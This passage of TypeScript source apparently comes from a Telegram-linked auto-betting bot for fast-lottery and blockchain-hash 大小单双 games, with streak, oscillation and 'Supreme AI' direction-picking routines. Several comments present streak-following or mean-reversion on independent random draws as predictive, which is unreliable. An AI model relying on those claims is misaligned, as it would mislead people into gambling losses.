  const record = betId ? betLog.find(b => b.id === betId) : betLog.find(b => b.status === "sent");
  if (record) {
    record.won = won;
    record.status = won ? "won" : "lost";
    if (pnl !== undefined) record.pnl = pnl;
    if (result) record.lotteryResult = result;
    if (period && !record.period) record.period = period;

    // 累计算法排行榜统计（仅主注，非追号）
    if (!isChase && record.algoId) {
      const key = record.algoId;
      if (!session.algoStats[key]) session.algoStats[key] = { wins: 0, losses: 0, pnl: 0 };
      if (won) session.algoStats[key]!.wins++;
      else session.algoStats[key]!.losses++;
      if (pnl !== undefined) session.algoStats[key]!.pnl += pnl;
    }
  }

  if (result && !isChase) {
    session.recentResults.push(result);
    if (session.recentResults.length > 30) session.recentResults.shift();
  }

  // 追号不影响主投注的连亏计数和资金策略
  if (!isChase) {
    // 原始算法方向准确率追踪（不受 flip 影响，防止反馈死循环）
    const rawDir = record?.rawAlgoDir;
    let rawCorrect: boolean;
    if (result && rawDir) {
      // 判断原始方向是否预测正确：用 mapR3ToEnabled 做兼容映射
      const mapped = mapR3ToEnabled(result, [rawDir]);
      if (mapped !== null) {
        rawCorrect = mapped === rawDir;
      } else if (rawDir.includes("+")) {
        // 复合方向如 "大单+小双"：result 对应其中一个即算正确
        rawCorrect = rawDir.split("+").some(part => mapR3ToEnabled(result, [part]) === part);
      } else {
        rawCorrect = won; // fallback
      }
    } else {
      rawCorrect = won; // 无结果/无原始方向时用最终胜负
    }
    session.consecutiveAlgoLosses = rawCorrect ? 0 : session.consecutiveAlgoLosses + 1;
    session.recentAlgoOutcomes.push(rawCorrect);
    if (session.recentAlgoOutcomes.length > 6) session.recentAlgoOutcomes.shift();
    // Flip 冷却倒计时：冷却期内不重新触发，冷却结束时清空计数
    if (session.algoFlipCooldown > 0) {
      session.algoFlipCooldown--;
      if (session.algoFlipCooldown === 0) {
        session.consecutiveAlgoLosses = 0;
        session.recentAlgoOutcomes = [];
      }
    }
    session.consecutiveLosses = won ? 0 : session.consecutiveLosses + 1;
    session.currentBet = computeNextBet(session, won);

    // adaptive_switch: 大小未中→切杀组；杀组中奖→切回大小
    if (session.cfg.algorithms.includes("adaptive_switch") && record) {
      if (record.isAdaptiveKillBet) {
        if (won) {
          session.adaptiveSwitchKillMode = false;
          pushEvent(session, "bet:alert", { message: "✅ 杀组命中，切回大小模式", level: "info" });
        }
      } else {
        if (!won) {
          session.adaptiveSwitchKillMode = true;
          pushEvent(session, "bet:alert", { message: "🔄 大小未中，切换杀组模式", level: "warn" });
        }
      }
    }
  }

  if (record) {
    // 统计只基于主注（非追号）
    const mainBets = betLog.filter(b => b.won !== undefined && !b.isChase);
    const wins = mainBets.filter(b => b.won === true).length;
    let streak = 0, maxS = 0;
    for (const b of [...betLog].reverse()) {
      if (b.isChase) continue;
      if (b.won === true) { streak++; if (streak > maxS) maxS = streak; }
      else if (b.won === false) streak = 0;
    }
    pushEvent(session, "bet:result", {
      bet: record,
      balance: session.balance,
      todayPnl: session.todayPnl,
      sessionPnl: session.sessionPnl,
      consecutiveLosses: session.consecutiveLosses,
      currentBet: session.currentBet,
      totalBets: betLog.filter(b => b.status !== "failed" && !b.isChase).length,
      settled: mainBets.length,
      wins, maxStreak: maxS,
      winRate: mainBets.length > 0 ? ((wins / mainBets.length) * 100).toFixed(2) : "0.00",
    });
  }
}

// ─── Algorithm helpers ────────────────────────────────────────────────────────

function dragonStreak(mapped: string[], label: string): number {
  let n = 0;
  for (let i = mapped.length - 1; i >= 0 && mapped[i] === label; i--) n++;
  return n;
}

function mapR3ToEnabled(r3: string, enabled: string[]): string | null {
  if (enabled.includes(r3)) return r3;
  if (enabled.includes("大") && r3.startsWith("大")) return "大";
  if (enabled.includes("小") && r3.startsWith("小")) return "小";
  if (enabled.includes("单") && r3.endsWith("单")) return "单";
  if (enabled.includes("双") && r3.endsWith("双")) return "双";
  return null;
}

function freqPick(items: string[], labels: string[], sortAsc: boolean): string | null {
  const freq: Record<string, number> = {};
  for (const l of labels) freq[l] = 0;
  for (const r of items) { const m = mapR3ToEnabled(r, labels); if (m) freq[m] = (freq[m] ?? 0) + 1; }
  const sorted = Object.entries(freq).sort((a, b) => sortAsc ? a[1] - b[1] : b[1] - a[1]);
  return sorted[0]?.[0] ?? labels[Math.floor(Math.random() * labels.length)] ?? null;
}

function buildHistory(session: TgSession): string[] {
  return session.recentResults.length >= 3
    ? session.recentResults.slice(-10)
    : [...lotteryHistoryCache.slice(-10), ...session.recentResults];
}

// ─── Pattern detection & adaptive algorithm selection ─────────────────────────

type MarketPattern = "streak" | "oscillating" | "neutral";

/** 长龙形态适用算法 */
const STREAK_ALGOS: AlgorithmId[] = ["streak_follow", "dragon_ride", "momentum", "signal_follow", "ai_trend", "adaptive_switch", "ks_follow", "ks_bb"];
/** 震荡形态适用算法 */
const OSCILLATING_ALGOS: AlgorithmId[] = ["anti_streak", "dragon_break", "signal_reverse", "ks_reverse", "ks_bb"];
/** 中性算法（兜底） */
const NEUTRAL_ALGOS: AlgorithmId[] = ["random", "cold_pick", "steady_ai", "ks_smart"];

/**
 * 检测最近 8 期走势形态：
 * - 交替占比 ≥ 65% → 震荡局
 * - 交替占比 ≤ 35% → 长龙局
 * - 其他 → 中性
 */
function detectPattern(session: TgSession): MarketPattern {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return "neutral";
  const history = buildHistory(session);
  const mapped = history.slice(-8)
    .map(r => mapR3ToEnabled(r, labels))
    .filter((x): x is string => x !== null);
  if (mapped.length < 4) return "neutral";

  let alternations = 0;
  for (let i = 1; i < mapped.length; i++) {
    if (mapped[i] !== mapped[i - 1]) alternations++;
  }
  const ratio = alternations / (mapped.length - 1);
  if (ratio >= 0.65) return "oscillating";
  if (ratio <= 0.35) return "streak";
  return "neutral";
}

/**
 * 从用户已选算法中，根据当前形态挑选最合适的那个。
 * - 形态匹配 → 从匹配集合中按 algIndex 轮换（多个同类算法时均衡使用）
 * - 无匹配 → 用中性算法；仍无 → 用第一个已选算法
 */
function selectAlgoByPattern(session: TgSession): AlgorithmId {
  const algos = session.cfg.algorithms;
  if (!algos.length) return "random";
  if (algos.length === 1) return algos[0]!;

  const pattern = detectPattern(session);
  session.currentPattern = pattern;

  let candidates: AlgorithmId[];
  if (pattern === "streak") {
    candidates = algos.filter(a => STREAK_ALGOS.includes(a));
  } else if (pattern === "oscillating") {
    candidates = algos.filter(a => OSCILLATING_ALGOS.includes(a));
  } else {
    candidates = algos.filter(a => NEUTRAL_ALGOS.includes(a));
  }

  if (!candidates.length) candidates = algos; // 兜底：全部已选算法
  return candidates[session.algIndex % candidates.length]!;
}

/**
 * 顺势而为：只看最近 3 期结果，多数方向即为投注方向。
 * 平局（大小各半等）时跟最新一期，不受 10 期整体频率干扰。
 */
function streakFollow(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const history = buildHistory(session);
  const mapped = history.slice(-3)
    .map(r => mapR3ToEnabled(r, labels))
    .filter((x): x is string => x !== null);
  if (!mapped.length) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  // Majority vote
  const freq: Record<string, number> = {};
  for (const l of labels) freq[l] = 0;
  for (const r of mapped) freq[r] = (freq[r] ?? 0) + 1;
  const maxCount = Math.max(...Object.values(freq));
  const winners = Object.entries(freq).filter(([, c]) => c === maxCount).map(([l]) => l);
  // Tie → follow the most recent result
  if (winners.length > 1) return mapped[mapped.length - 1] ?? null;
  return winners[0] ?? null;
}

function dragonRide(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  if (mapped.length < 3) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const last = mapped[mapped.length - 1]!;
  return dragonStreak(mapped, last) >= 3 ? last : (labels[Math.floor(Math.random() * labels.length)] ?? null);
}

function dragonBreak(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  if (mapped.length < 4) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const last = mapped[mapped.length - 1]!;
  if (dragonStreak(mapped, last) >= 4) {
    const opp = labels.find(l => l !== last);
    return opp ?? labels[Math.floor(Math.random() * labels.length)] ?? null;
  }
  return labels[Math.floor(Math.random() * labels.length)] ?? null;
}

function momentum(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  if (!mapped.length) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const weights: Record<string, number> = {};
  for (const l of labels) weights[l] = 0;
  mapped.forEach((r, i) => { weights[r] = (weights[r] ?? 0) + (i + 1); });
  return Object.entries(weights).sort((a, b) => b[1] - a[1])[0]?.[0] ?? labels[0] ?? null;
}

function antiStreak(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length) return null;
  const mapped = buildHistory(session).map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
  const last5 = mapped.slice(-5);
  if (last5.length >= 3) {
    const alternating = last5.every((x, i) => i === 0 || x !== last5[i - 1]);
    if (alternating) {
      const opp = labels.find(l => l !== last5[last5.length - 1]);
      if (opp) return opp;
    }
  }
  return freqPick(mapped, labels, false);
}

// ─── Algorithm / direction decision ──────────────────────────────────────────

function parseBetLabel(text: string): string | null {
  const lower = text.toLowerCase();
  if (lower.includes("大单")) return "大单";
  if (lower.includes("大双")) return "大双";
  if (lower.includes("小单")) return "小单";
  if (lower.includes("小双")) return "小双";
  if (lower.includes("大")) return "大";
  if (lower.includes("小")) return "小";
  if (lower.includes("单")) return "单";
  if (lower.includes("双")) return "双";
  return null;
}

// ─── 快三专用算法 ──────────────────────────────────────────────────────────────

/** 从 session.kuaisanResults（只含快三数据）构造算法用历史，oldest→newest */
function buildKsHistory(session: TgSession, labels: string[]): string[] {
  return (session.kuaisanResults ?? [])
    .slice().reverse() // kuaisanResults is newest-first; reverse to oldest-first
    .map(r => mapR3ToEnabled(r.label, labels))
    .filter((x): x is string => x !== null);
}

/** 跟上期：直接跟上一局快三结果的方向 */
function ksFollow(session: TgSession, labels: string[]): string | null {
  const h = buildKsHistory(session, labels);
  if (!h.length) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  return h[h.length - 1] ?? null;
}

/** 反上期：押上一局的反方向 */
function ksReverse(session: TgSession, labels: string[]): string | null {
  const h = buildKsHistory(session, labels);
  if (!h.length) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const last = h[h.length - 1]!;
  return labels.find(l => l !== last) ?? last;
}

/**
 * AABB 形态识别：
 * - 连续两期相同 (AA) → 跟上期（顺势）
 * - 两期不同 (AB)     → 押反（震荡反转）
 */
function ksBB(session: TgSession, labels: string[]): string | null {
  const h = buildKsHistory(session, labels);
  if (h.length < 2) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const last = h[h.length - 1]!;
  const prev = h[h.length - 2]!;
  if (last === prev) return last;                       // AA → 顺
  return labels.find(l => l !== last) ?? last;          // AB → 反
}

/**
 * 智能均值回归：
 * - 近5期某方向 ≥4次 → 押另一方向（强回归信号）
 * - 其余情况跟近3期多数
 */
function ksSmart(session: TgSession, labels: string[]): string | null {
  if (labels.length < 2) return labels[0] ?? null;
  const [optA, optB] = [labels[0]!, labels[1]!];
  const h = buildKsHistory(session, labels);
  if (h.length < 3) return labels[Math.floor(Math.random() * labels.length)] ?? null;
  const r5 = h.slice(-5);
  const cntA = r5.filter(x => x === optA).length;
  const cntB = r5.length - cntA;
  if (cntA >= 4) return optB;
  if (cntB >= 4) return optA;
  // 近3期多数投票
  const r3 = h.slice(-3);
  const vA = r3.filter(x => x === optA).length;
  const vB = r3.length - vA;
  return vA >= vB ? optA : optB;
}

// ─── Hash (哈希) 专属算法 ─────────────────────────────────────────────────────

/**
 * 将哈希历史结果映射到 labels 维度。
 * session.hashResults 存储 HashResult 对象；session.recentResults 存储 label 字符串。
 * 优先用 hashResults，不够时补 recentResults。
 */
function buildHashHistory(session: TgSession, labels: string[]): string[] {
  const [optA, optB] = [labels[0]!, labels[1] ?? labels[0]!];
  const raw: string[] = [];

  // 从 hashResults 中提取
  const hr = session.hashResults ?? [];
  for (let i = hr.length - 1; i >= 0; i--) {
    const r = hr[i]!;
    if (labels.includes(r.label)) { raw.push(r.label); continue; }
    // 映射大小单双
    if (labels.includes("大") || labels.includes("小")) {
      raw.push(r.big ? "大" : "小"); continue;
    }
    if (labels.includes("单") || labels.includes("双")) {
      raw.push(r.odd ? "单" : "双"); continue;
    }
    if (labels.includes("大单") || labels.includes("小双") || labels.includes("大双") || labels.includes("小单")) {
      const combo = `${r.big ? "大" : "小"}${r.odd ? "单" : "双"}`;
      const mapped = labels.includes(combo) ? combo : null;
      if (mapped) raw.push(mapped); else raw.push(optA);
      continue;
    }
    raw.push(optA);
  }

  // 不够则补 recentResults
  if (raw.length < 20) {
    for (let i = session.recentResults.length - 1; i >= 0 && raw.length < 40; i--) {
      const lbl = session.recentResults[i]!;
      if (labels.includes(lbl)) { raw.push(lbl); continue; }
      const isBig = lbl.startsWith("大");
      const isSmall = lbl.startsWith("小");
      const isOdd = lbl.includes("单");
      if (labels.length === 2) {
        if (labels[0] === "大" || labels[0] === "小") raw.push(isBig ? "大" : "小");
        else if (labels[0] === "单" || labels[0] === "双") raw.push(isOdd ? "单" : "双");
        else raw.push(optA);
      } else {
        const combo = `${isBig ? "大" : isSmall ? "小" : "大"}${isOdd ? "单" : "双"}`;
        raw.push(labels.includes(combo) ? combo : optA);
      }
    }
  }

  // raw 是倒序（最新在最前），需要正序
  return raw.reverse();
}

/**
 * 哈希算法1 — 区块链龙形
 *
 * 原理：ETH/TRON 区块哈希是强随机源，连续同向超过5期后统计回归概率显著上升。
 * 策略：
 *   - 连续同向 1-5 期 → 跟随（顺势）
 *   - 连续同向 6+ 期  → 反向（统计回归）
 *   - 若近3期出现2次以上交替（ABAB）→ 跟最新一期（波段跟尾）
 */
function hashDragon(session: TgSession, labels: string[]): string | null {
  if (labels.length < 2) return labels[0] ?? null;
  const [optA, optB] = [labels[0]!, labels[1]!];
  const h = buildHashHistory(session, labels);
  if (h.length < 2) return labels[Math.floor(Math.random() * labels.length)] ?? null;

  const last = h[h.length - 1]!;
  const opp = last === optA ? optB : optA;

  // 计算当前连续龙长度
  let streak = 1;
  for (let i = h.length - 2; i >= 0; i--) {
    if (h[i] === last) streak++;
    else break;
  }

  // 近4期交替密度
  const tail4 = h.slice(-4);
  let altCnt = 0;
  for (let i = 1; i < tail4.length; i++) if (tail4[i] !== tail4[i - 1]) altCnt++;
  const isOscillating = tail4.length >= 3 && altCnt >= 3; // 4期3次交替 = ABAB型

  if (isOscillating) return last; // 震荡尾部跟最新一期（波段惯性）
  if (streak >= 6) return opp;    // 超长龙反转
  return last;                    // 1-5期顺龙
}

/**
 * 哈希算法2 — 双链均衡
 *
 * 原理：ETH+TRON 双链独立，理论上大小/单双长期各占50%。
 * 策略：三窗口加权评分（3/6/12期），偏差超过阈值时押均值回归方向；
 *        结果集中在边界附近（12-15）时，反映两链哈希接近边界值，押突破方向。
 */
function hashBalance(session: TgSession, labels: string[]): string | null {
  if (labels.length < 2) return labels[0] ?? null;
  const [optA, optB] = [labels[0]!, labels[1]!];
  const h = buildHashHistory(session, labels);
  if (h.length < 3) return labels[Math.floor(Math.random() * labels.length)] ?? null;

  // 三窗口加权：短期权重最高（近期更有参考价值）
  type Window = { size: number; weight: number; revThresh: number };
  const windows: Window[] = [
    { size: 3,  weight: 3, revThresh: 3 },  // 3期全同方向 → 强回归
    { size: 6,  weight: 2, revThresh: 5 },  // 6期5+同方向 → 回归
    { size: 12, weight: 1, revThresh: 9 },  // 12期9+同方向 → 回归
  ];

  let scoreA = 0; // 正分 = 支持押 optA
  let scoreB = 0;

  for (const w of windows) {
    const slice = h.slice(-w.size);
    if (slice.length < Math.ceil(w.size * 0.5)) continue;
    const cntA = slice.filter(x => x === optA).length;
    const cntB = slice.length - cntA;

    if (cntA >= w.revThresh) {
      // optA 占比过高 → 回归信号支持 optB
      scoreB += w.weight * (cntA - Math.floor(w.size / 2));
    } else if (cntB >= w.revThresh) {
      // optB 占比过高 → 回归信号支持 optA
      scoreA += w.weight * (cntB - Math.floor(w.size / 2));
    } else {
      // 均衡区间：跟随近期多数
      if (cntA > cntB) scoreA += w.weight;
      else scoreB += w.weight;
    }
  }

  // 边界聚集检测：近5期哈希值在12-15之间的数量
  // 边界聚集意味着下期结果方向不稳定，跟随最近一期
  const hr = (session.hashResults ?? []).slice(0, 5);
  const boundaryCount = hr.filter(r => r.value >= 12 && r.value <= 15).length;
  if (boundaryCount >= 3 && h.length > 0) {
    // 边界聚集：跟最近一期
    const lastLbl = h[h.length - 1]!;
    return labels.includes(lastLbl) ? lastLbl : (scoreA >= scoreB ? optA : optB);
  }

  if (scoreA === scoreB) return h[h.length - 1] ?? optA; // 平局跟最近
  return scoreA > scoreB ? optA : optB;
}

/**
 * 哈希算法3 — MD5波段
 *
 * 原理：MD5 提取数字后取末3位求和，产生特定的"波段"结构——
 *        短期动量 × 中期偏差修正 × 交替密度三维合力决策。
 * 策略：
 *   M1 短期动量（近3期）：一致则跟，不一致取最新
 *   M2 中期偏差（近8期）：超过5.5:2.5偏差则押少数
 *   M3 交替密度（近6期）：交替率≥0.7押反最新（震荡市），≤0.3押跟（龙市）
 *   三维评分加权，取胜出方向
 */
function hashWave(session: TgSession, labels: string[]): string | null {
  if (labels.length < 2) return labels[0] ?? null;
  const [optA, optB] = [labels[0]!, labels[1]!];
  const h = buildHashHistory(session, labels);
  if (h.length < 3) return labels[Math.floor(Math.random() * labels.length)] ?? null;

  let scoreA = 0;
  let scoreB = 0;

  // ── M1 短期动量（近3期，权重3） ──────────────────────────────────
  const t3 = h.slice(-3);
  const m1A = t3.filter(x => x === optA).length;
  const m1B = t3.length - m1A;
  if (m1A === 3) scoreA += 3;       // 3连同方向 → 强动量
  else if (m1B === 3) scoreB += 3;
  else if (m1A > m1B) scoreA += 1;  // 2-1 多数方向
  else if (m1B > m1A) scoreB += 1;
  else {
    // 1-1-? 平局时跟最新
    const lnew = h[h.length - 1];
    if (lnew === optA) scoreA += 1; else scoreB += 1;
  }

  // ── M2 中期偏差（近8期，权重2） ──────────────────────────────────
  if (h.length >= 5) {
    const t8 = h.slice(-8);
    const m2A = t8.filter(x => x === optA).length;
    const m2B = t8.length - m2A;
    const ratio = t8.length > 0 ? m2A / t8.length : 0.5;
    if (ratio >= 0.70) scoreB += 2;      // optA 强势 → 回归押 optB
    else if (ratio <= 0.30) scoreA += 2; // optB 强势 → 回归押 optA
    else if (m2A > m2B) scoreA += 1;
    else if (m2B > m2A) scoreB += 1;
  }

  // ── M3 交替密度（近6期，权重2） ──────────────────────────────────
  if (h.length >= 4) {
    const t6 = h.slice(-6);
    let altCnt = 0;
    for (let i = 1; i < t6.length; i++) if (t6[i] !== t6[i - 1]) altCnt++;
    const altRate = t6.length > 1 ? altCnt / (t6.length - 1) : 0.5;
    const latest = h[h.length - 1]!;
    const latestOpp = latest === optA ? optB : optA;
    if (altRate >= 0.70) {
      // 高频震荡市：押反最新（ABABAB → 下期可能继续交替）
      if (latestOpp === optA) scoreA += 2; else scoreB += 2;
    } else if (altRate <= 0.25) {
      // 低频龙市：押跟最新
      if (latest === optA) scoreA += 2; else scoreB += 2;
    }
    // 中间区间：M3不加分，由M1/M2决定
  }

  if (scoreA === scoreB) {
    // 平局：取近5期少数方向（统计弱势更可能回归）
    const t5 = h.slice(-5);
    const a5 = t5.filter(x => x === optA).length;
    return a5 < Math.ceil(t5.length / 2) ? optA : optB;
  }

  return scoreA > scoreB ? optA : optB;
}

function runAlgo(session: TgSession, algoId: AlgorithmId, labels: string[], signalText = ""): string | null {
  if (algoId === "hash_follow")  return hashDragon(session, labels);
  if (algoId === "hash_reverse") return hashBalance(session, labels);
  if (algoId === "hash_smart")   return hashWave(session, labels);
  if (algoId === "ks_follow")        return ksFollow(session, labels);
  if (algoId === "ks_reverse")       return ksReverse(session, labels);
  if (algoId === "ks_bb")            return ksBB(session, labels);
  if (algoId === "ks_smart")         return ksSmart(session, labels);
  if (algoId === "ai_trend")       return decideAI(session);
  if (algoId === "steady_ai")      return decideSteady(session);
  if (algoId === "adaptive_switch") return decideSteady(session); // 大小阶段用升级版AI决策
  if (algoId === "random") return labels[Math.floor(Math.random() * labels.length)] ?? null;
  if (algoId === "dragon_ride") return dragonRide(session);
  if (algoId === "dragon_break") return dragonBreak(session);
  if (algoId === "momentum") return momentum(session);
  if (algoId === "anti_streak") return antiStreak(session);
  if (algoId === "streak_follow") return streakFollow(session);
  if (algoId === "signal_follow" || algoId === "signal_reverse") {
    const p = parseBetLabel(signalText);
    if (!p) return null;
    // Detect strong oscillation in the current labels dimension
    const h8sig = [...lotteryHistoryCache, ...session.recentResults].slice(-8);
    const mappedSig = h8sig.map(r => mapR3ToEnabled(r, labels)).filter((x): x is string => x !== null);
    let altSig = 0;
    for (let i = 1; i < mappedSig.length; i++) if (mappedSig[i] !== mappedSig[i - 1]) altSig++;
    const altRatioSig = mappedSig.length > 1 ? altSig / (mappedSig.length - 1) : 0.5;
    const strongOscillation = altRatioSig >= 0.75; // ABAB pattern → signal direction will likely flip
    const strongStreak = altRatioSig <= 0.25;     // streak market → signal direction will likely continue
    const opp: Record<string, string> = { 大:"小", 小:"大", 单:"双", 双:"单", 大单:"小双", 大双:"小单", 小单:"大双", 小双:"大单" };
    // signal_follow: follow signal, but auto-flip in strong oscillation (signal = last result = wrong direction)
    // signal_reverse: counter signal, but skip counter in strong streak (signal = last result = right direction)
    const baseFollow = algoId === "signal_follow"
      ? (strongOscillation ? (opp[p] ?? p) : p)   // oscillation: flip
      : (strongStreak     ? p : (opp[p] ?? p));    // reverse: skip counter in streak
    const candidate = labels.includes(baseFollow) ? baseFollow : (labels.includes(p) ? p : (labels[0] ?? null));
    return candidate;
  }
  const history = buildHistory(session);
  return freqPick(history, labels, algoId === "cold_pick");
}

/** 当连续方向错误 OR 近期胜率过低时，反转算法输出方向（含冷却机制防振荡） */
function applyAlgoFlip(session: TgSession, direction: string | null, labels: string[]): string | null {
  if (!direction) return direction;
  const threshold = session.cfg.algoFlipOnLoss ?? 0;
  if (threshold <= 0) return direction;

  // 找反向选项
  const opp: Record<string, string> = {
    大:"小", 小:"大", 单:"双", 双:"单",
    大单:"小双", 大双:"小单", 小单:"大双", 小双:"大单",
    大单小双:"小单大双", 小单大双:"大单小双",
  };
  const flipped = opp[direction] ?? null;
  const finalDir = (flipped && labels.includes(flipped)) ? flipped
    : (flipped ? flipped : direction);
  if (finalDir === direction) return direction; // 没有可翻转的方向，跳过

  // 冷却期内：继续反转，不重新评估（防止振荡）
  if (session.algoFlipCooldown > 0) return finalDir;

  // 评估触发条件（基于原始算法准确率，不受 flip 影响）
  const consecTrigger = session.consecutiveAlgoLosses >= threshold;
  const outcomes = session.recentAlgoOutcomes;
  const windowTrigger = outcomes.length >= 6 &&
    (outcomes.filter(Boolean).length / outcomes.length) <= 0.33;

  if (!consecTrigger && !windowTrigger) return direction;

  // 触发：设置4局冷却，清空计数，等待重新评估
  session.algoFlipCooldown = 4;
  session.consecutiveAlgoLosses = 0;
  session.recentAlgoOutcomes = [];

  const reason = consecTrigger
    ? `连续原始错误 ${session.consecutiveAlgoLosses + threshold} 局`
    : `近6局原始胜率仅 ${Math.round((outcomes.filter(Boolean).length / Math.max(outcomes.length, 1)) * 100)}%`;
  pushEvent(session, "bet:alert", {
    level: "warn",
    message: `🔄 ${reason}，自动反转方向：${direction} → ${finalDir}（冷却4局）`,
  });
  return finalDir;
}

function decideBet(session: TgSession, signalText: string): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length || !session.cfg.algorithms.length) return null;
  const algoId = selectAlgoByPattern(session);
  const raw = runAlgo(session, algoId, labels, signalText);
  session.lastRawAlgoDir = raw;
  const direction = applyAlgoFlip(session, raw, labels);
  if (direction !== null) { session.algIndex++; session.lastAlgoUsed = algoId; }
  return direction;
}

function decideBetAuto(session: TgSession): string | null {
  const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
  if (!labels.length || !session.cfg.algorithms.length) return null;
  const algoId = selectAlgoByPattern(session);
  const raw = runAlgo(session, algoId, labels);
  session.lastRawAlgoDir = raw;
  const direction = applyAlgoFlip(session, raw, labels);
  if (direction !== null) { session.algIndex++; session.lastAlgoUsed = algoId; }
  return direction;
}

/**
 * ── Supreme AI ──────────────────────────────────────────────────────────────
 * 8 模块集成决策系统，动态权重 + 熵自适应，覆盖所有走势形态：
 *   M1: 龙形判断（短龙跟/中龙打/长龙跟）
 *   M2: 震荡波型检测（ABAB / AABB / 混沌）
 *   M3: 多周期频率偏差（5/10/20/50期均值回归）
 *   M4: 指数衰减动量（近期结果指数加权）
 *   M5: 统计偏差修正（极端偏离强制回归）
 *   M6: 区间突破动量（短期方向漂移）
 *   M7: 熵值自适应（有序市场跟势，混沌市场回归）
 *   M8: 全局少数方向（终局平局决胜）
 * ────────────────────────────────────────────────────────────────────────────
 */
function decideAI(session: TgSession): string | null {
  // ── 双组模式：AI 在 [大单+小双] 和 [小单+大双] 两个组合间选一组 ─────────
  let optA: string;
  let optB: string;
  let history: string[];

  if (session.cfg.dualGroupMode) {
    optA = "大单小双"; optB = "小单大双";
    history = [...lotteryHistoryCache, ...session.recentResults]
      .map(r => (r === "大单" || r === "小双") ? optA : (r === "小单" || r === "大双") ? optB : null)
      .filter((x): x is string => x !== null);
  } else {
    const labels = session.cfg.betOptions.map(o => BET_OPTION_LABELS[o]);
    if (labels.length < 2) return labels[0] ?? null;
    [optA, optB] = labels as [string, string];
    history = [...lotteryHistoryCache, ...session.recentResults]
      .map(r => mapR3ToEnabled(r, [optA, optB]))
      .filter((x): x is string => x !== null);
  }

  if (history.length < 3) return Math.random() < 0.5 ? optA : optB;

  // Helpers
  const countA = (arr: string[]) => arr.filter(x => x === optA).length;
  const ratioA = (arr: string[]) => arr.length ? countA(arr) / arr.length : 0.5;
  const last = (n: number) => history.slice(-n);
  const latest = history[history.length - 1]!;

  let score = 0; // positive → optA, negative → optB

  // ── M1: 龙形判断 ─────────────────────────────────────────────────────────
  // Measure consecutive streak of latest result
  let streakLen = 0;
  for (let i = history.length - 1; i >= 0 && history[i] === latest; i--) streakLen++;

  // 超长龙保护：≥8期连出时，均值回归失效，直接顺龙
  if (streakLen >= 8) {
    session.lastAIBet = latest;
    return latest;
  }

  if (streakLen <= 1) {
    // no streak — neutral
  } else if (streakLen <= 3) {
    // 短龙：顺势 (强度2)
    score += latest === optA ? 2 : -2;
  } else if (streakLen <= 5) {
    // 中龙4-5：仍然顺势，每期独立事件，均值回归无统计依据 (强度1.5)
    score += latest === optA ? 1.5 : -1.5;
  } else {
    // 长龙6-7：超强龙，继续跟 (强度4)
    score += latest === optA ? 4 : -4;
  }

  // ── M2: 震荡波型检测 ──────────────────────────────────────────────────────
  const h8 = last(8);
  if (h8.length >= 4) {
    let altCount = 0;
    for (let i = 1; i < h8.length; i++) if (h8[i] !== h8[i - 1]) altCount++;
    const altRatio = altCount / (h8.length - 1);

    if (altRatio >= 0.75) {
      // 强震荡 ABAB：投上期反面
      score += latest === optA ? -2.5 : 2.5;
    } else if (altRatio <= 0.25) {
      // 强龙市：继续跟（M1已算，额外加权）
      score += latest === optA ? 1.5 : -1.5;
    }

    // AABB 双跳检测：AB各出2连后切换
    const h4 = h8.slice(-4);
    if (h4[0] === h4[1] && h4[2] === h4[3] && h4[0] !== h4[2]) {
      // AABB 完成，下一期大概率重复 h4[3]
      score += h4[3] === optA ? 1.5 : -1.5;
    }
  }

  // ── M3: 多周期频率偏差（轻度均值回归，仅极端偏差才介入）──────────────
  // 权重大幅降低：彩票独立事件，强均值回归无统计依据；仅在极端情况给轻推
  const windows: [number, number][] = [[5, 0.8], [10, 0.6], [20, 0.4], [50, 0.25]];
  for (const [w, wt] of windows) {
    const slice = last(w);
    if (slice.length < Math.min(w, 4)) continue;
    const r = ratioA(slice);
    if      (r >= 0.70) score -= wt * 2.0;  // optA 极端过多 → 轻推 optB
    else if (r >= 0.60) score -= wt * 0.8;
    else if (r <= 0.30) score += wt * 2.0;  // optA 极端过少 → 轻推 optA
    else if (r <= 0.40) score += wt * 0.8;
    // 50%±10% 区间：不干预，视为正常随机波动
  }

  // ── M4: 指数衰减动量跟随（时间越近权重越高）──────────────────────────
  // 原逻辑是"动量反转"（实为均值回归），改为真正的动量跟随：
  // 近期偏 optA → 跟 optA；近期偏 optB → 跟 optB
  const h15 = last(15);
  let emoScore = 0;
  for (let i = 0; i < h15.length; i++) {
    const decay = Math.pow(1.25, i); // h15[0]=oldest(低权), h15[n-1]=newest(高权)
    emoScore += h15[i] === optA ? decay : -decay;
  }
  score += emoScore > 0 ? 1.0 : -1.0; // 动量跟随（权重适中）

  // ── M5: 统计偏差修正（仅极端情况轻推，不强制回归）───────────────────
  const h30 = last(30);
  if (h30.length >= 15) {
    const dev = (ratioA(h30) - 0.5) * 2; // -1~+1，正=偏A
    score -= dev * 1.5; // 降低权重：3.5→1.5，避免与 M3/M4 叠加过度压制趋势
  }

  // ── M6: 区间突破动量 ──────────────────────────────────────────────────────
  const h10 = last(10);
  if (h10.length >= 8) {
